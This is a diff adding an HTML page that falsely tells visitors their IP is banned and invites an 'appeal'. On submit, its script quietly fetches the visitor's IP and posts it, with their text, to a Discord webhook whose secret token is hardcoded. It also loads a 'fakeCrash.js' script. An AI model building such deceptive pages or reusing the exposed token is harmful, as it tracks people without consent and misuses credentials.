@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Lost</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: rgb(55, 55, 55);
+        }
+        .error-message {
+            text-align: center;
+            background: rgb(55, 55, 55);
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"], button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4CAF50;
+            color: rgb(255, 255, 255);
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #3e8e41;
+        }
+        footer {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-message">
+        <h2>Connection Lost:</h2>
+        <p>Your IP has been banned from the site.</p>
+
+        <h3>Appeal Ban:</h3>
+        <form id="appealForm">
+            <input type="text" name="Reason" id="reason" placeholder="Why should we unban you?" required>
+            <button type="submit">Submit Appeal</button>
+        </form>
+        <footer>
+            <p>IP banned.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const form = document.getElementById('appealForm');
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent form submission
+
+                const reason = document.getElementById('reason').value;
+                if (!reason) {
+                    alert("Please provide a reason for the appeal.");
+                    return;
+                }
+
+                // Get the user's IP address
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const userIP = data.ip;
+
+                        const embed = {
+                            title: "Ban Appeal",
+                            description: "A user has submitted a ban appeal.",
+                            fields: [
+                                {
+                                    name: "Reason",
+                                    value: reason,
+                                    inline: true
+                                },
+                                {
+                                    name: "IP:",
+                                    value: "|| " + userIP + " ||",
+                                    inline: true
+                                }
+                            ]
+                        };
+
+                        // Send the embed to the Discord webhook
+                        fetch("https://discord.com/api/webhooks/1415373223687749735/qm69WoTzXZmlA_JW3EIAsSPk5OEdmg0Z7dTOYa_qLlet3GYx4LkN72Hjlgsr-8Zi3OSS", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ embeds: [embed] })
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                alert("Ban appeal submitted successfully!");
+                                document.querySelector('footer p').textContent = 'Ban Appeal has been submitted.';
+                            } else {
+                                console.error('Error submitting ban appeal:', response.status);
+                                alert(`Error submitting ban appeal: ${response.status}`);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error submitting ban appeal:', error);
+                            alert('Error submitting ban appeal. Check the console for details.');
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error getting user IP:', error);
+                        alert('Error getting user IP. Please try again later.');
+                    });
+            });
+        });
+    </script>
+</body>
+    <script src="a/b/c/d/e/fakeCrash.js"></script>
+</html>
